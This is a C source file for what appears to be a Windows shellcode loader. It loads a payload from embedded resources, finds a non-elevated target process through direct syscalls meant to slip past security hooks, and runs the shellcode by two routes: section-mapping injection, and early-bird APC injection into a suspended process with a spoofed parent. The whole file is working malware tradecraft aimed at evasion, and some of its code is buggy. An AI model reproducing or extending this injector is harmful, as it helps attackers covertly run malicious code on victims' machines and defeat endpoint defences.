#include "Common.h"
#include "Resource.h"
#include "SysWhispers.h"
#include "EntropyReducer.h"

BOOL LoadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSize)
{
	HRSRC		hRsrc = NULL;
	HGLOBAL		hGlobal = NULL;

	// Get the location to the data stored in .rsrc by its id *IDR_RCDATA1*
	hRsrc = g_Api.pFindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (hRsrc == NULL) {
		// in case of function failure 
		PRINTA("[!] FindResourceW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Get HGLOBAL, or the handle of the specified resource data since its required to call LockResource later
	hGlobal = g_Api.pLoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		// in case of function failure 
		PRINTA("[!] LoadResource Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Get the address of our payload in .rsrc section
	*ppPayloadAddress = g_Api.pLockResource(hGlobal);
	if (*ppPayloadAddress == NULL) {
		// in case of function failure 
		PRINTA("[!] LockResource Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Get the size of our payload in .rsrc section
	*pPayloadSize = g_Api.pSizeofResource(NULL, hRsrc);
	if (*pPayloadSize == 0) {
		// in case of function failure 
		PRINTA("[!] SizeofResource Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

// TODO: use syscalls or API hashing
// TODO: understand the code
BOOL IsProcessElevated(HANDLE hProcess) {
	HANDLE			hToken = NULL;
	TOKEN_ELEVATION elevation = { 0 };
	DWORD			dwSize = 0;

	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
		return FALSE;  // Assume not elevated if we can't open the token
	}

	if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);
	return elevation.TokenIsElevated;
}

BOOL GetRemoteProcessHandle(IN LPCWSTR pwstrProcName, IN DWORD* pdwPid, IN HANDLE* phProcess)
{
	ULONG							uReturnLen1 = 0;
	ULONG							uReturnLen2 = 0;
	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
	NTSTATUS						status = 0;

	// First NtQuerySystemInformation call
	// This will fail with STATUS_INFO_LENGTH_MISMATCH
	// But it will provide information about how much memory to allocate (uReturnLen1)
	WhisperHell(g_SyscallsTable.NtQuerySystemInformation.wSystemCall);
	NtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uReturnLen1);

	// Allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uReturnLen1);
	if (SystemProcInfo == NULL) {
		PRINTA("[!] HeapAlloc Failed With Error :  0x%0.8X\n", GetLastError());
		return FALSE;
	}

	// Second NtQuerySystemInformation call
	// Calling NtQuerySystemInformation with the correct arguments, the output will be saved to 'SystemProcInfo'
	WhisperHell(g_SyscallsTable.NtQuerySystemInformation.wSystemCall);
	if ((status = NtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2) != 0x0)) {
		PRINTA("[!] HellDescent Failed With Error :  0x%0.8X\n", status);
		return FALSE;
	}
	PRINTA("[+] Retrieved SystemProcInfo Structure At %p with Actual Retrieved Size: %d\n", SystemProcInfo, uReturnLen2);

	// Since we will modify 'SystemProcInfo', we will save its initial value before the while loop to free it later
	PSYSTEM_PROCESS_INFORMATION pValueToFree = SystemProcInfo;

	// 'SystemProcInfo' will now represent a new element in the array
	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);

	while (TRUE) {
		PRINTW(L"[i] Checking Process Name: %ws\n", SystemProcInfo->ImageName.Buffer);

		// Small check for the process's name size
		// Comparing the enumerated process name to what we want to target
		if (SystemProcInfo->ImageName.Length && IsStringEqual(pwstrProcName, SystemProcInfo->ImageName.Buffer) == TRUE) {
			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
			/// ERROR: If the process has higher privileges than the current process, OpenProcess will fail and phProcess will be NULL
			//*phProcess = g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
			//break;

			/// INFO: PROCESS_QUERY_LIMITED_INFORMATION allows querying limited details about the process without requiring full access rights.
			HANDLE hProcess = g_Api.pOpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
			if (hProcess) {
				if (!IsProcessElevated(hProcess)) {  // Check if process is non-elevated
					*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
					*phProcess = hProcess;
					break;
				}
				CloseHandle(hProcess); // Close handle if elevated
			}
		}

		// If NextEntryOffset is 0, we reached the end of the array
		if (SystemProcInfo->NextEntryOffset == 0)
			break;

		// Move to the next element in the array
		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
	}

	HeapFree(GetProcessHeap(), 0, pValueToFree);

	// Check if we successfully got the target process handle
	if (*pdwPid == 0 || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}

BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bIsLocalInjection) {
	// Init local vars
	NTSTATUS		status = 0x0;
	HANDLE          hSection = NULL, hThread = NULL;
	PVOID			pAllocatedAddress = NULL;
	PVOID			pAllocatedRemoteAddress = NULL;
	PVOID			pExecAddress = NULL;
	LARGE_INTEGER	liMaxSize = { .LowPart = (DWORD)sPayloadSize };
	SIZE_T          sViewSize = 0;
	DWORD           dwLocalFlag = bIsLocalInjection ? PAGE_EXECUTE_READWRITE : PAGE_READWRITE;

	// Allocating local map view
	WhisperHell(g_SyscallsTable.NtCreateSection.wSystemCall);
	if ((status = NtCreateSection(
		&hSection,
		SECTION_ALL_ACCESS,
		NULL,
		&liMaxSize,
		PAGE_EXECUTE_READWRITE,
		SEC_COMMIT,
		NULL
	)) != 0) {
		PRINTA("[!] NtCreateSection Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}
	WhisperHell(g_SyscallsTable.NtMapViewOfSection.wSystemCall);
	if ((status = NtMapViewOfSection(
		hSection,
		GetCurrentProcessHandle(),
		&pAllocatedAddress,
		NULL, NULL, NULL,
		&sViewSize,
		ViewShare,
		NULL,
		dwLocalFlag
	)) != 0) {
		PRINTA("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}
	PRINTA("[+] Local Memory Allocated At : 0x%p Of Size : %d \n", pAllocatedAddress, (INT)sViewSize);

	// Writing the payload
	PRINTA("[#] Press <Enter> To Write The Payload ... ");
	GETCHAR();

	CopyMemoryEx(pAllocatedAddress, pPayload, sPayloadSize);
	PRINTA("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pAllocatedAddress);

	// Allocating remote map view 
	if (!bIsLocalInjection) {
		WhisperHell(g_SyscallsTable.NtMapViewOfSection.wSystemCall);
		if ((status = NtMapViewOfSection(
			hSection,
			hProcess,
			&pAllocatedRemoteAddress,
			NULL, NULL, NULL,
			&sViewSize,
			ViewShare,
			NULL,
			PAGE_EXECUTE_READWRITE
		)) != 0x0) {
			PRINTA("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", status);
			return FALSE;
		}
		PRINTA("[+] Remote Memory Allocated At : 0x%p Of Size : %d \n", pAllocatedRemoteAddress, (INT)sViewSize);
	}

	// Executing the payload via thread creation
	pExecAddress = pAllocatedAddress;
	if (!bIsLocalInjection) {
		pExecAddress = pAllocatedRemoteAddress;
	}

	PRINTA("[#] Press <Enter> To Run The Payload ... ");
	GETCHAR();

	PRINTA("\t[i] Running Thread Of Entry 0x%p ... ", pExecAddress);
	WhisperHell(g_SyscallsTable.NtCreateThreadEx.wSystemCall);
	if ((status = NtCreateThreadEx(
		&hThread,
		THREAD_ALL_ACCESS,
		NULL,
		hProcess,
		pExecAddress,
		NULL,
		NULL,
		NULL, NULL, NULL,
		NULL
	)) != 0x0) {
		PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}
	PRINTA("[+] DONE \n");
	if (hThread != 0x0) {
		PRINTA("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));
	}

	// Waiting for the thread to finish
	WhisperHell(g_SyscallsTable.NtWaitForSingleObject.wSystemCall);
	if ((status = NtWaitForSingleObject(
		hThread,
		FALSE,
		NULL
	)) != 0x0) {
		PRINTA("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}

	// Unmapping the local view
	WhisperHell(g_SyscallsTable.NtUnmapViewOfSection.wSystemCall);
	if ((status = NtUnmapViewOfSection(
		hProcess,
		pAllocatedAddress
	)) != 0x0) {
		PRINTA("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}

	// Closing the section handle
	WhisperHell(g_SyscallsTable.NtClose.wSystemCall);
	if ((status = NtClose(
		hSection
	)) != 0x0) {
		PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}

	return TRUE;
}

// Function used for APC Injection with PPID Spoofing
// TODO: use syscalls or API hashings
BOOL CreatePPidSpoofedAndSuspendedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread)
{
	CHAR                               lpPath[MAX_PATH * 2];
	CHAR                               WnDr[MAX_PATH];

	SIZE_T                             sThreadAttList = NULL;
	PPROC_THREAD_ATTRIBUTE_LIST        pThreadAttList = NULL;

	STARTUPINFOEXA                     SiEx = { 0 };
	PROCESS_INFORMATION                Pi = { 0 };

	ZeroMemoryEx(&SiEx, sizeof(STARTUPINFOEXA));
	ZeroMemoryEx(&Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		PRINTA("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	wsprintfA(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);

	// This will fail with ERROR_INSUFFICIENT_BUFFER, as expected
	InitializeProcThreadAttributeList(
		NULL,
		1,
		NULL,
		&sThreadAttList);

	// Allocating enough memory
	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
	if (pThreadAttList == NULL) {
		PRINTA("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Calling InitializeProcThreadAttributeList again, but passing the right parameters
	if (!InitializeProcThreadAttributeList(
		pThreadAttList,
		1,
		NULL,
		&sThreadAttList)) {
		PRINTA("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!UpdateProcThreadAttribute(
		pThreadAttList,
		NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		&hParentProcess,
		sizeof(HANDLE),
		NULL,
		NULL)) {
		PRINTA("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Setting the LPPROC_THREAD_ATTRIBUTE_LIST element in SiEx to be equal to what was
	// created using UpdateProcThreadAttribute - that is the parent process
	SiEx.lpAttributeList = pThreadAttList;

	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		EXTENDED_STARTUPINFO_PRESENT | DEBUG_PROCESS,
		NULL,
		NULL,
		&SiEx.StartupInfo,
		&Pi)) {
		PRINTA("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	// Cleaning up
	DeleteProcThreadAttributeList(pThreadAttList);
	CloseHandle(hParentProcess);

	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}

// TODO: use syscalls or API hashing
BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, OUT PVOID* ppInjectedShellcodeAddress)
{

	PVOID	pShellcodeAddress = NULL;

	SIZE_T	sNumberOfBytesWritten = NULL;
	DWORD	dwOldProtection = NULL;


	// Allocate memory in the remote process of size sSizeOfShellcode 
	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		PRINTA("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	PRINTA("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);


	PRINTA("[#] Press <Enter> To Write Payload ... ");
	GETCHAR();
	// Write the shellcode in the allocated memory
	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		PRINTA("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	PRINTA("[i] Successfully Written %d Bytes\n", (DWORD)sNumberOfBytesWritten);

	memset(pShellcode, '\0', sSizeOfShellcode);

	// Make the memory region executable
	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		PRINTA("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	*ppInjectedShellcodeAddress = pShellcodeAddress;

	return TRUE;
}

// TODO: use syscalls or API hashing
BOOL RemoteEarlyBirdApcInjectionViaSyscalls(HANDLE hParentProcess, LPCSTR pstrSacrificalProcessName, PVOID pShellcodeAddress, SIZE_T sSizeOfShellcode)
{

	HANDLE hProcess = NULL, hThread = NULL;
	DWORD dwProcessId = 0;
	PVOID pInjectedAddress = NULL;

	// Create the sacrificial thread
	if (!CreatePPidSpoofedAndSuspendedProcess(
		hParentProcess,
		pstrSacrificalProcessName,
		&dwProcessId,
		hProcess,
		hThread)) {
		PRINTA("[!] CreatePPidSpoofedAndSuspendedProcess Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// TODO: Inject the shellcode to the sacrificial process
	if (!InjectShellcodeToRemoteProcess(hProcess, pShellcodeAddress, sSizeOfShellcode, &pInjectedAddress)) {
		PRINTA("[!] InjectShellcodeToRemoteProcess Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// TODO: Queue the APC
	if (!QueueUserAPC((PAPCFUNC)pInjectedAddress, hThread, NULL)) {
		PRINTA("[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// TODO: Detach the debugger
	if (!DebugActiveProcessStop(dwProcessId)) {
		PRINTA("[!] DebugActiveProcessStop Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// TODO: Wait until the thread is finished
	if (!WaitForSingleObject(hThread, INFINITE)) {
		PRINTA("[!] WaitForSingleObject Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// TODO: Release the allocated memory
	if (!VirtualFreeEx(hProcess, pInjectedAddress, 0, MEM_RELEASE)) {
		PRINTA("[!] VirtualFreeEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}